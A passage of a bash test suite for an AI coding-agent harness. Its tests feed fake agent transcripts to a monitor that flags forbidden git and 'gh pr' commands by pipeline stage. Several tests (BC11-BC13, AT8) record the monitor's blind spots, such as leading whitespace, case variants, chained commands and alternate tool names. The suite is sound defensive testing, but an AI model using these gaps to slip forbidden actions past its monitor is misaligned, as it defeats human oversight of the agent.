{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || bc8_rc=$?

if [[ "$bc8_rc" == "23" ]] \
   && [[ -f "$VIOLATION_BC8" ]] \
   && [[ "$(cat "$VIOLATION_BC8")" == "git switch -c feature/eng-66-qa" ]] \
   && grep -q '\[assert\] stage=qa transcript invoked forbidden branch-creation form: git switch -c feature/eng-66-qa' <<<"$RENDER_OUT_BC8"; then
  pass_at "BC8 (cross-stage gating): branch-creation form on stage=qa → rc=23 (D-002 no-stage-gate verified)"
else
  fail_at "BC8 cross-stage gating" "rc=$bc8_rc viol_exists=$([[ -f $VIOLATION_BC8 ]] && echo y || echo n) viol_body=$(cat "$VIOLATION_BC8" 2>/dev/null) out=$RENDER_OUT_BC8"
fi
rm -f "$VIOLATION_BC8"

# ─── QA-authored adversarial fixtures (AT1-AT5; ENG-43 not in Failure Mode → Test Map) ─
# AS1-AS6 cover the helper in isolation. AT1-AT5 cover gaps the plan
# explicitly accepted as "implicit" or didn't enumerate — most importantly
# the renderer-wrapper integration (gating, sidecar write, pre-clean) which
# AS1-AS6 do not exercise at all.

# ─── AT1: renderer integration, stage="implementing" + match → rc=22, sidecar, log ─
# AS1-AS6 exercise the helper directly. None test that
# _render_and_capture_stream actually fires the assertion when stage is
# implementing, writes the sidecar to $issue_dir/.transcript-violation-implementing,
# logs the matched command, and returns 22. Pin the renderer wrapper end-to-end.
USAGE_AT1="$ISSUE_DIR/usage-implementing-AT1.json"
RAW_AT1="$ISSUE_DIR/.raw-stream.ndjson.tmp"
VIOLATION_AT1="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_AT1" "$RAW_AT1" "$VIOLATION_AT1"

at1_rc=0
RENDER_OUT_AT1="$(
  _render_and_capture_stream "$USAGE_AT1" "$ISSUE_DIR" "implementing" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at1","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title at1 --body forbidden"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || at1_rc=$?

if [[ "$at1_rc" == "22" ]] \
   && [[ -f "$VIOLATION_AT1" ]] \
   && [[ "$(cat "$VIOLATION_AT1")" == "gh pr create --title at1 --body forbidden" ]] \
   && grep -q '\[assert\] implement-stage transcript invoked forbidden tool: gh pr create --title at1 --body forbidden' <<<"$RENDER_OUT_AT1"; then
  pass_at "AT1 (renderer integration): stage=implementing+match → rc=22, sidecar written, log line emitted"
else
  fail_at "AT1 renderer integration" "rc=$at1_rc viol_exists=$([[ -f $VIOLATION_AT1 ]] && echo y || echo n) viol_body=$(cat "$VIOLATION_AT1" 2>/dev/null) out=$RENDER_OUT_AT1"
fi
rm -f "$VIOLATION_AT1"

# ─── AT2: renderer cross-stage gating: stage="planning" + match in transcript → rc=0 ─
# Verify the stage gate actually works. A non-implementing stage with a
# transcript that *would* match must not trigger the assertion, must not
# write any sidecar (neither .transcript-violation-implementing nor
# .transcript-violation-planning), and must return 0.
USAGE_AT2="$ISSUE_DIR/usage-planning-AT2.json"
VIOLATION_AT2_IMPL="$ISSUE_DIR/.transcript-violation-implementing"
VIOLATION_AT2_PLAN="$ISSUE_DIR/.transcript-violation-planning"
rm -f "$USAGE_AT2" "$ISSUE_DIR/.raw-stream.ndjson.tmp" "$VIOLATION_AT2_IMPL" "$VIOLATION_AT2_PLAN"

at2_rc=0
_render_and_capture_stream "$USAGE_AT2" "$ISSUE_DIR" "planning" >/dev/null 2>&1 <<'NDJSON' || at2_rc=$?
{"type":"system","subtype":"init","session_id":"at2","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title at2-should-be-ignored"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON

if [[ "$at2_rc" == "0" ]] \
   && [[ ! -f "$VIOLATION_AT2_IMPL" ]] \
   && [[ ! -f "$VIOLATION_AT2_PLAN" ]]; then
  pass_at "AT2 (cross-stage gating): stage=planning with matching transcript → rc=0, no sidecar"
else
  fail_at "AT2 cross-stage gating" "rc=$at2_rc viol_impl=$([[ -f $VIOLATION_AT2_IMPL ]] && echo y || echo n) viol_plan=$([[ -f $VIOLATION_AT2_PLAN ]] && echo y || echo n)"
fi
rm -f "$VIOLATION_AT2_IMPL" "$VIOLATION_AT2_PLAN"

# ─── AT3: renderer pre-cleans stale sidecar from prior crashed dispatch ───
# Plan §4 row "Sidecar present from a prior crashed dispatch" is marked
# "implicit (single-line rm -f in Task 2) — covered by code review".
# Promote that to a real test: pre-seed a stale sidecar, run the renderer
# with implementing stage and a *clean* transcript, and verify the stale
# sidecar is removed and no new one is written.
USAGE_AT3="$ISSUE_DIR/usage-implementing-AT3.json"
VIOLATION_AT3="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_AT3" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
printf 'stale gh pr create --title leftover-from-prior-crash\n' > "$VIOLATION_AT3"
[[ -s "$VIOLATION_AT3" ]] || die "AT3 setup failed: stale sidecar not seeded"

at3_rc=0
_render_and_capture_stream "$USAGE_AT3" "$ISSUE_DIR" "implementing" >/dev/null 2>&1 <<'NDJSON' || at3_rc=$?
{"type":"system","subtype":"init","session_id":"at3","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git status"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON

if [[ "$at3_rc" == "0" ]] && [[ ! -f "$VIOLATION_AT3" ]]; then
  pass_at "AT3 (pre-clean stale sidecar): renderer entry rm -f removed prior-crash .transcript-violation-implementing"
else
  fail_at "AT3 pre-clean stale sidecar" "rc=$at3_rc viol_exists=$([[ -f $VIOLATION_AT3 ]] && echo y || echo n) viol_contents=$(cat "$VIOLATION_AT3" 2>/dev/null)"
fi
rm -f "$VIOLATION_AT3"

# ─── AT4: helper multi-match ordering — head -1 returns the FIRST match ───
# Plan §4 row "Multiple matching tool_use blocks" is marked "implicit
# (jq stream order; AS1 already exercises a single match)". AS1 has one
# match, so it cannot pin first-vs-last. Pin "first wins" so a future
# refactor (e.g. swapping head -1 for tail -1, or moving to a sort-by
# filter) breaks loudly.
TX_AT4="$_TEST_STUB_DIR/tx-at4.ndjson"
cat > "$TX_AT4" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at4","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title FIRST"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title SECOND"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title THIRD"}}]}}
NDJSON
out_at4="$(assert_no_tool_invocation "$TX_AT4" "gh pr create")" && rc_at4=0 || rc_at4=$?
if [[ "$rc_at4" == "1" && "$out_at4" == "gh pr create --title FIRST" ]]; then
  pass_at "AT4 (multi-match): head -1 returns the FIRST match (not last); rc=1, first command on stdout"
else
  fail_at "AT4 multi-match" "rc=$rc_at4 out=$out_at4"
fi

# ─── AT5: pattern with regex metacharacters → literal startswith, not regex ──
# Plan §4 row "Pattern contains regex metacharacters" is "implicit (jq
# semantics)". jq's startswith is a literal-string match. Pin: pattern
# "gh pr create.*" matches "gh pr create.*foo" (literal `.*` characters)
# but NOT "gh pr create --title x" (which would match if `.*` were a
# regex wildcard). A future refactor swapping to `test($p)` or `match($p)`
# would silently broaden the match surface.
TX_AT5="$_TEST_STUB_DIR/tx-at5.ndjson"
cat > "$TX_AT5" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at5","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create --title would-match-if-regex"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"gh pr create.*literal-dot-star"}}]}}
NDJSON
out_at5="$(assert_no_tool_invocation "$TX_AT5" "gh pr create.*")" && rc_at5=0 || rc_at5=$?
if [[ "$rc_at5" == "1" && "$out_at5" == "gh pr create.*literal-dot-star" ]]; then
  pass_at "AT5 (regex literal): pattern \"gh pr create.*\" matched as literal characters; \"gh pr create --title …\" not matched"
else
  fail_at "AT5 regex literal" "rc=$rc_at5 out=$out_at5"
fi

# ─── AT6: renderer integration, stage="building" + match → rc=26, sidecar, log ─
# AS7-AS12 cover the helper. AT6 covers the renderer-wrapper end-to-end
# for the build path: gating, sidecar write, pre-clean, log emission.
USAGE_AT6="$ISSUE_DIR/usage-building-AT6.json"
RAW_AT6="$ISSUE_DIR/.raw-stream.ndjson.tmp"
VIOLATION_AT6="$ISSUE_DIR/.transcript-violation-building"
rm -f "$USAGE_AT6" "$RAW_AT6" "$VIOLATION_AT6"

at6_rc=0
RENDER_OUT_AT6="$(
  _render_and_capture_stream "$USAGE_AT6" "$ISSUE_DIR" "building" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at6","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout main"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || at6_rc=$?

if [[ "$at6_rc" == "26" ]] \
   && [[ -f "$VIOLATION_AT6" ]] \
   && [[ "$(cat "$VIOLATION_AT6")" == "git checkout main" ]] \
   && grep -q '\[assert\] build-stage transcript invoked forbidden tool: git checkout main' <<<"$RENDER_OUT_AT6"; then
  pass_at "AT6 (renderer integration): stage=building+match → rc=26, sidecar written, log line emitted"
else
  fail_at "AT6 renderer integration" "rc=$at6_rc viol_exists=$([[ -f $VIOLATION_AT6 ]] && echo y || echo n) viol_body=$(cat "$VIOLATION_AT6" 2>/dev/null) out=$RENDER_OUT_AT6"
fi
rm -f "$VIOLATION_AT6"

# ─── AT7: renderer cross-stage gating, stage="qa" + match → rc=0 ─
# The building-stage block must not fire on non-building stages. Mirror
# of AT2 for the building-stage gate.
USAGE_AT7="$ISSUE_DIR/usage-qa-AT7.json"
VIOLATION_AT7_BUILD="$ISSUE_DIR/.transcript-violation-building"
VIOLATION_AT7_QA="$ISSUE_DIR/.transcript-violation-qa"
rm -f "$USAGE_AT7" "$ISSUE_DIR/.raw-stream.ndjson.tmp" "$VIOLATION_AT7_BUILD" "$VIOLATION_AT7_QA"

at7_rc=0
_render_and_capture_stream "$USAGE_AT7" "$ISSUE_DIR" "qa" >/dev/null 2>&1 <<'NDJSON' || at7_rc=$?
{"type":"system","subtype":"init","session_id":"at7","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout main-should-be-ignored-on-qa"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON

if [[ "$at7_rc" == "0" ]] \
   && [[ ! -f "$VIOLATION_AT7_BUILD" ]] \
   && [[ ! -f "$VIOLATION_AT7_QA" ]]; then
  pass_at "AT7 (cross-stage gating): stage=qa with matching transcript → rc=0, no sidecar"
else
  fail_at "AT7 cross-stage gating" "rc=$at7_rc viol_build=$([[ -f $VIOLATION_AT7_BUILD ]] && echo y || echo n) viol_qa=$([[ -f $VIOLATION_AT7_QA ]] && echo y || echo n)"
fi
rm -f "$VIOLATION_AT7_BUILD" "$VIOLATION_AT7_QA"

# ─── ENG-71 QA-authored adversarial fixtures (AT8-AT11) ───────────────
# AS7-AS12 + AT6-AT7 cover the FM-Map. AT8-AT11 close the gaps a cold
# sub-agent (general-purpose, May-2026 invocation) flagged as untested:
#   AT8  — `tool_use` for a non-Bash tool with `.input.command`
#          starting with the pattern must NOT match (the helper's
#          `.name == "Bash"` discriminator is the contract).
#   AT9  — assistant `.message.content[]` mixing `text` blocks AND
#          `tool_use` blocks must still scan the tool_use entries
#          (regression guard: `.message.content[]?` iterator must
#          not get short-circuited to first element).
#   AT10 — first-pattern-first-match precedence at the renderer-wrapper
#          level: when the transcript contains BOTH a `git pull` AND a
#          `git checkout` tool_use (in either NDJSON order), the loop's
#          declared pattern order (`git checkout` first) determines the
#          violation reported in the sidecar. This is loop-order, not
#          transcript-order — operators reading the violation see the
#          loop-order winner, NOT necessarily the temporally-first
#          forbidden command. Pinning this prevents a refactor that
#          re-orders the `for _pat in …` loop from silently changing
#          the operator-facing diagnostic.
#   AT11 — null/missing `.input.command` (`{"input":{}}` with no
#          `command` field) must NOT crash the matcher and must NOT
#          spuriously match (the `// ""` defaults to empty, which
#          startswith($p) returns true for ANY non-empty pattern by
#          jq's startswith definition? — actually startswith on empty
#          string returns false except when $p is also empty, but the
#          contract is "no false positive on missing command"; this
#          fixture pins that contract end-to-end).
printf '\n--- ENG-71: QA-authored adversarial AT8-AT11 ---\n'

# AT8 — non-Bash tool with `.input.command` starting with the pattern → NO MATCH.
TX_AT8="$_TEST_STUB_DIR/tx-at8.ndjson"
cat > "$TX_AT8" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at8","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Read","input":{"command":"git checkout main"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Edit","input":{"command":"git switch feature"}}]}}
NDJSON
at8_failures=0
for _pat in 'git checkout' 'git switch' 'git pull' 'git reset'; do
  out_at8="$(assert_no_tool_invocation "$TX_AT8" "$_pat")" && rc_at8=0 || rc_at8=$?
  if [[ "$rc_at8" != "0" || -n "$out_at8" ]]; then
    at8_failures=$((at8_failures+1))
    fail_at "AT8 ($_pat non-Bash discriminator)" "rc=$rc_at8 out=$out_at8 (expected rc=0; tool_use was Read/Edit, not Bash)"
  fi
done
if [[ "$at8_failures" == "0" ]]; then
  pass_at "AT8: non-Bash tool_use with .input.command matching pattern → rc=0 (the .name == \"Bash\" discriminator holds)"
fi

# AT9 — assistant.message.content array mixes text + tool_use; the matcher
# must still find the tool_use match when text blocks share the array.
TX_AT9="$_TEST_STUB_DIR/tx-at9.ndjson"
cat > "$TX_AT9" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at9","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"I will sync main now."},{"type":"tool_use","name":"Bash","input":{"command":"git checkout main"}},{"type":"text","text":"Done."}]}}
NDJSON
out_at9="$(assert_no_tool_invocation "$TX_AT9" "git checkout")" && rc_at9=0 || rc_at9=$?
if [[ "$rc_at9" == "1" && "$out_at9" == "git checkout main" ]]; then
  pass_at "AT9: text+tool_use mixed in same content[] → matcher finds tool_use match (rc=1)"
else
  fail_at "AT9 mixed content[] iteration" "rc=$rc_at9 out=$out_at9 (expected rc=1, out='git checkout main' — content[]? must iterate all members regardless of type)"
fi

# AT10 — renderer-wrapper integration with two distinct forbidden patterns
# in the SAME transcript. NDJSON has `git pull` BEFORE `git checkout`, but
# the for-loop in dispatch.sh iterates patterns in order
# `git checkout, git switch, git pull, git reset` — so `git checkout` is
# tested first and short-circuits via `return 26` before `git pull` is
# checked. Pin loop-order-first-match: violation_file holds the
# `git checkout` command, NOT the temporally-first `git pull` command.
USAGE_AT10="$ISSUE_DIR/usage-building-AT10.json"
VIOLATION_AT10="$ISSUE_DIR/.transcript-violation-building"
rm -f "$USAGE_AT10" "$ISSUE_DIR/.raw-stream.ndjson.tmp" "$VIOLATION_AT10"

at10_rc=0
RENDER_OUT_AT10="$(
  _render_and_capture_stream "$USAGE_AT10" "$ISSUE_DIR" "building" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at10","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git pull --ff-only origin main"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout main"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || at10_rc=$?

if [[ "$at10_rc" == "26" ]] \
   && [[ -f "$VIOLATION_AT10" ]] \
   && [[ "$(cat "$VIOLATION_AT10")" == "git checkout main" ]]; then
  pass_at "AT10 (loop-order precedence): two forbidden tool_use blocks (git pull then git checkout) → sidecar holds 'git checkout main' (loop iterates git checkout first)"
else
  fail_at "AT10 loop-order precedence" "rc=$at10_rc viol_body=$(cat "$VIOLATION_AT10" 2>/dev/null) (expected rc=26, sidecar='git checkout main' regardless of NDJSON order)"
fi
rm -f "$VIOLATION_AT10"

# AT11 — tool_use with empty `.input` object (no `.command` field). The
# `// ""` default in the jq filter must coerce missing command to empty
# string; startswith($p) on an empty string returns false for any
# non-empty $p. No match, no crash.
TX_AT11="$_TEST_STUB_DIR/tx-at11.ndjson"
cat > "$TX_AT11" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"at11","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":""}}]}}
NDJSON
at11_failures=0
for _pat in 'git checkout' 'git switch' 'git pull' 'git reset'; do
  out_at11="$(assert_no_tool_invocation "$TX_AT11" "$_pat")" && rc_at11=0 || rc_at11=$?
  if [[ "$rc_at11" != "0" || -n "$out_at11" ]]; then
    at11_failures=$((at11_failures+1))
    fail_at "AT11 ($_pat null/empty command)" "rc=$rc_at11 out=$out_at11 (expected rc=0; missing/empty .input.command must coerce to empty)"
  fi
done
if [[ "$at11_failures" == "0" ]]; then
  pass_at "AT11: null/missing/empty .input.command on Bash tool_use → rc=0 for all four patterns (no crash, no false positive)"
fi

# ─── ENG-66 QA-authored adversarial fixtures (BC9-BC13) ──────────────
# BC1-BC8 cover each banned form, the canonical-checkout passthrough,
# the chained-command blind spot, and renderer integration on two
# stages. BC9-BC13 close the gaps a cold sub-agent flagged as worth
# pinning that the plan's Failure Mode → Test Map handled implicitly:
#
#   BC9  — multi-pattern transcript: TWO ENG-66 banned forms in the
#          same NDJSON. Pattern loop iterates `-b → -B → -m → -c`;
#          pin sidecar holds the FIRST-iterated-pattern winner, NOT
#          the temporally-first violation. Mirror of AT10 for the
#          ENG-66 loop.
#   BC10 — cross-loop interaction with ENG-68: transcript contains
#          both `git checkout -b foo` AND `git config core.bare true`.
#          ENG-66 loop is positioned BEFORE the ENG-68 block in
#          _render_and_capture_stream, so rc=23 fires first; ENG-68's
#          rc=13 is never evaluated. Sidecar reflects branch-creation
#          violation only. Pin to prevent reorder regression.
#   BC11 — leading-whitespace bypass: `.input.command = "  git
#          checkout -b foo"`. startswith("git checkout -b") is false
#          on a leading-space input — pin the inherited startswith
#          blind spot for the negative case (rc=0). Documents the
#          gap so a future jq `ltrimstr` upgrade is intentional.
#   BC12 — case-sensitivity: `.input.command = "GIT CHECKOUT -B foo"`
#          and `Git checkout -b bar`. startswith is byte-literal so
#          neither matches; rc=0 for all four patterns. Pin negative
#          behavior; macOS HFS+ is case-insensitive at the FS layer
#          but the matcher is at the string layer.
#   BC13 — non-Bash tool name: `.name = "bash"` (lowercase) carrying
#          a banned command. The jq filter requires `.name == "Bash"`
#          (capital-B); lowercase is dropped silently. Pin rc=0 for
#          all four patterns. Mirror of AT8 (which pins this for the
#          ENG-71 patterns).
printf '\n--- ENG-66: QA-authored adversarial BC9-BC13 ---\n'

# BC9 — multi-pattern transcript: `git switch -c foo` BEFORE `git checkout -b bar`
# in NDJSON order, but loop iterates `-b → -B → -m → -c` so `git checkout -b`
# is checked first. Sidecar must hold `git checkout -b bar` (loop-first
# winner), not `git switch -c foo` (temporally-first violation).
USAGE_BC9="$ISSUE_DIR/usage-implementing-BC9.json"
VIOLATION_BC9="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_BC9" "$ISSUE_DIR/.raw-stream.ndjson.tmp" "$VIOLATION_BC9"

bc9_rc=0
RENDER_OUT_BC9="$(
  _render_and_capture_stream "$USAGE_BC9" "$ISSUE_DIR" "implementing" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc9","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git switch -c feature/eng-66-foo"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout -b feature/eng-66-bar"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || bc9_rc=$?

if [[ "$bc9_rc" == "23" ]] \
   && [[ -f "$VIOLATION_BC9" ]] \
   && [[ "$(cat "$VIOLATION_BC9")" == "git checkout -b feature/eng-66-bar" ]]; then
  pass_at "BC9 (multi-pattern loop-order): two ENG-66 violations in transcript → sidecar holds 'git checkout -b ...' (loop-first winner, not NDJSON-first)"
else
  fail_at "BC9 multi-pattern loop-order" "rc=$bc9_rc viol_body=$(cat "$VIOLATION_BC9" 2>/dev/null) (expected rc=23, sidecar='git checkout -b feature/eng-66-bar' regardless of NDJSON order)"
fi
rm -f "$VIOLATION_BC9"

# BC10 — cross-loop interaction: ENG-66 fires before ENG-68. Transcript
# carries BOTH `git checkout -b foo` (ENG-66 violation) AND `git config
# core.bare true` (ENG-68 violation). _render_and_capture_stream's
# ENG-66 block sits BEFORE ENG-68 in source order; rc=23 must short-
# circuit before rc=13 has a chance to fire.
USAGE_BC10="$ISSUE_DIR/usage-implementing-BC10.json"
VIOLATION_BC10="$ISSUE_DIR/.transcript-violation-implementing"
rm -f "$USAGE_BC10" "$ISSUE_DIR/.raw-stream.ndjson.tmp" "$VIOLATION_BC10"

bc10_rc=0
RENDER_OUT_BC10="$(
  _render_and_capture_stream "$USAGE_BC10" "$ISSUE_DIR" "implementing" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc10","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git config core.bare true"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git checkout -b feature/eng-66-x"}}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)" || bc10_rc=$?

if [[ "$bc10_rc" == "23" ]] \
   && [[ -f "$VIOLATION_BC10" ]] \
   && [[ "$(cat "$VIOLATION_BC10")" == "git checkout -b feature/eng-66-x" ]]; then
  pass_at "BC10 (ENG-66 ↑ ENG-68 ordering): transcript with both violations → rc=23 fires first, sidecar reflects branch-creation"
else
  fail_at "BC10 ENG-66/ENG-68 ordering" "rc=$bc10_rc viol_body=$(cat "$VIOLATION_BC10" 2>/dev/null) (expected rc=23, ENG-66 must short-circuit before ENG-68's rc=13)"
fi
rm -f "$VIOLATION_BC10"

# BC11 — leading-whitespace bypass. `.input.command = "  git checkout -b foo"`
# starts with two spaces; jq's startswith("git checkout -b") returns false.
# Pin the inherited startswith blind spot — same family as BC6 (chained
# commands). Documents the gap so a future ltrimstr/normalization
# upgrade does not silently flip behavior without an audit.
TX_BC11="$_TEST_STUB_DIR/tx-bc11.ndjson"
cat > "$TX_BC11" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc11","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"  git checkout -b feature/eng-99-foo"}}]}}
NDJSON
out_bc11="$(assert_no_tool_invocation "$TX_BC11" "git checkout -b")" && rc_bc11=0 || rc_bc11=$?
if [[ "$rc_bc11" == "0" && -z "$out_bc11" ]]; then
  pass_at "BC11: leading-whitespace bypass — '  git checkout -b feature/eng-99-foo' does NOT match (startswith blind spot, negative pin)"
else
  fail_at "BC11 leading-whitespace bypass" "rc=$rc_bc11 out=$out_bc11 (expected rc=0; startswith is byte-literal — leading whitespace must NOT match)"
fi

# BC12 — case-sensitivity. startswith is a byte-literal compare; uppercase
# `GIT CHECKOUT -B foo` and mixed-case `Git checkout -b bar` must NOT match.
# Pin negative behavior so a future case-fold upgrade is intentional.
TX_BC12="$_TEST_STUB_DIR/tx-bc12.ndjson"
cat > "$TX_BC12" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc12","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"GIT CHECKOUT -B feature/eng-99-foo"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"Git checkout -b feature/eng-99-bar"}}]}}
NDJSON
bc12_failures=0
for _pat in 'git checkout -b' 'git checkout -B' 'git branch -m' 'git switch -c'; do
  out_bc12="$(assert_no_tool_invocation "$TX_BC12" "$_pat")" && rc_bc12=0 || rc_bc12=$?
  if [[ "$rc_bc12" != "0" || -n "$out_bc12" ]]; then
    bc12_failures=$((bc12_failures+1))
    fail_at "BC12 ($_pat case-variant)" "rc=$rc_bc12 out=$out_bc12 (expected rc=0; startswith is case-sensitive)"
  fi
done
if [[ "$bc12_failures" == "0" ]]; then
  pass_at "BC12: case-variant — 'GIT CHECKOUT -B …' and 'Git checkout -b …' do NOT match any of the four patterns (startswith is byte-literal)"
fi

# BC13 — non-Bash tool name: `.name = "bash"` (lowercase) with a banned
# command. The jq filter at bin/dispatch.sh:56 requires `.name == "Bash"`;
# lowercase variants are silently filtered out before pattern matching.
# Pin rc=0 to surface the contract that the discriminator is strict-equals
# on the canonical capital-B name. Mirror of AT8 for ENG-66 patterns.
TX_BC13="$_TEST_STUB_DIR/tx-bc13.ndjson"
cat > "$TX_BC13" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"bc13","model":"test"}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"bash","input":{"command":"git checkout -b feature/eng-99-foo"}}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Shell","input":{"command":"git switch -c feature/eng-99-bar"}}]}}
NDJSON
bc13_failures=0
for _pat in 'git checkout -b' 'git checkout -B' 'git branch -m' 'git switch -c'; do
  out_bc13="$(assert_no_tool_invocation "$TX_BC13" "$_pat")" && rc_bc13=0 || rc_bc13=$?
  if [[ "$rc_bc13" != "0" || -n "$out_bc13" ]]; then
    bc13_failures=$((bc13_failures+1))
    fail_at "BC13 ($_pat non-Bash tool name)" "rc=$rc_bc13 out=$out_bc13 (expected rc=0; .name == \"Bash\" discriminator excludes lowercase 'bash' and 'Shell')"
  fi
done
if [[ "$bc13_failures" == "0" ]]; then
  pass_at "BC13: tool_use with .name=\"bash\" (lowercase) or \"Shell\" carrying banned commands → rc=0 for all four patterns (.name == \"Bash\" discriminator holds)"
fi

# ─── ENG-49 Gap #7: prompt↔allowlist contract ─────────────────────────
# For each stage, every `gh pr <verb>` token appearing in
# AGENT_PROMPTS.md §S must be allowlisted in allowed_tools_for(S).
# Token regex matches shell-shaped instances: line-start whitespace
# (or backtick) + `gh pr ` + one verb word.
HARNESS_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

contract_check_stage() {
  local stage="$1" section="$2"
  local section_body verbs missing=""
  section_body="$(awk -v h="$section" '
    /^## /{ if (in_section) exit; if (index($0, h)) {in_section=1; next} }
    in_section{print}
  ' "$HARNESS_ROOT/AGENT_PROMPTS.md")"
  verbs="$(printf '%s\n' "$section_body" \
    | grep -oE '(`|^[[:space:]]+)gh pr [a-z]+' \
    | grep -oE 'gh pr [a-z]+' \
    | sort -u || true)"
  local tools; tools="$(allowed_tools_for "$stage")"
  while IFS= read -r v; do
    [[ -z "$v" ]] && continue
    [[ "$tools" == *"$v"* ]] || missing+="$v "
  done <<<"$verbs"
  if [[ -z "$missing" ]]; then
    pass_at "Gap-7 contract: $stage allowlist covers all gh pr verbs in §$section"
  else
    fail_at "Gap-7 contract: $stage allowlist missing: $missing" "tools: $tools"
  fi
}

printf '\n--- ENG-49 Gap #7: prompt<->allowlist contract ---\n'
contract_check_stage implementing  "## 3. Implementation Agent (Backend)"
contract_check_stage ui            "## 4. UI Agent (Frontend)"
contract_check_stage reviewing     "## 5. Review Agent"
contract_check_stage qa            "## 6. QA Agent"
contract_check_stage building      "## 7. Build Agent"

# ─── ENG-53 #8: harness target's dispatch.tools populated ──────────────
# Per the ENG-44 dogfood post-mortem: the implement and qa stages on
# harness-self had no allowlisted way to invoke `bash bin/<name>-test.sh`
# (the harness's testing convention per learned-rules/harness/project-
# profile.md). Implement shipped a broken `read -r cfg sf` test that
# pass-by-accident; qa explicitly flagged "harness sandbox blocked
# direct `bash bin/<test>.sh` execution" before proceeding. The fix is
# pure config — populate harness's own .pipeline-config/config.json::
# dispatch.tools.{implement,qa}[] with the test-runner pattern. ENG-51's
# dispatch.tools mechanism does the rest.
#
